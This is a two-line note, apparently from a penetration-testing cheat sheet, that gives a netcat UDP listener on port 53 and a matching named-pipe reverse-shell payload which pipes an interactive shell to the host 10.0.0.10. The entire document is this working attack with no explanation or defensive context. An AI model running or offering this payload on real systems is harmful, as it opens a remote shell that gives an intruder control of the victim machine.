Listener:
nc -lvnup 53

Payload:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -u 10.0.0.10 53 >/tmp/f

